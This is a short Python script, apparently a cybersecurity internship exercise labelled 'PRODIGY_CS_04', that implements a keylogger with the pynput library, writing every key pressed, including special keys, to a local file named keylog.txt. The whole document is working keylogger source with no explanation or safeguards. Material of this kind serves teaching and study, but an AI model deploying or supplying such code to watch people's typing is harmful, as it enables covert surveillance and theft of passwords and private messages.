# PRODIGY_CS_04
from pynput import keyboard

# File to store logs
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

# Start listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
